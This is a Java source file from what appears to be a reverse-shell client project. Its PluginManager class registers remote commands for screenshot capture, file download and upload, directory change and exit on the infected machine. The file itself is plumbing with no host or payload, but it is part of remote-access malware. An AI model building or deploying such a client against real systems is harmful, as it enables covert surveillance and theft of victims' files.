package obs1d1anc1ph3r.reverseshell.client.plugins;

import java.util.Collections;
import java.util.HashMap;
import java.util.Map;
import obs1d1anc1ph3r.reverseshell.client.utils.StreamHandler;
import obs1d1anc1ph3r.reverseshell.client.responsehandling.ResponseSender;

public class PluginManager {

	private final Map<String, CommandPlugin> plugins = new HashMap<>();

	public PluginManager(StreamHandler streamHandler) {
		loadPlugins(streamHandler); //This took me a while to figure out how to pass this through
	}

	private void loadPlugins(StreamHandler streamHandler) {
		ResponseSender responseSender = new ResponseSender(streamHandler, streamHandler.getEncryptionKey()); //Get the response sender

		ScreenshotCommand screenshotCommand = new ScreenshotCommand(streamHandler); //Screenshot command
		screenshotCommand.setResponseSender(responseSender); //Pass the responseSender through
		plugins.put(screenshotCommand.getCommandName().toLowerCase(), screenshotCommand);

		DownloadCommand downloadCommand = new DownloadCommand(streamHandler); //Download command
		downloadCommand.setResponseSender(responseSender); //Pass the responseSender through
		plugins.put(downloadCommand.getCommandName().toLowerCase(), downloadCommand);

		CDCommand cdCommand = new CDCommand(); //Pretty nice to have, no clue if this works for windows, but we'll burn that bridge when we get to it
		plugins.put(cdCommand.getCommandName().toLowerCase(), cdCommand);

		UploadCommand uploadCommand = new UploadCommand(streamHandler);
		plugins.put(uploadCommand.getCommandName().toLowerCase(), uploadCommand);

		ExitCommand exitCommand = new ExitCommand(streamHandler);
		plugins.put(exitCommand.getCommandName(), exitCommand);

	}

	public CommandPlugin getPlugin(String commandName) {
		return plugins.get(commandName.toLowerCase());
	}

	public Map<String, CommandPlugin> getPlugins() {
		return Collections.unmodifiableMap(plugins);
	}
}
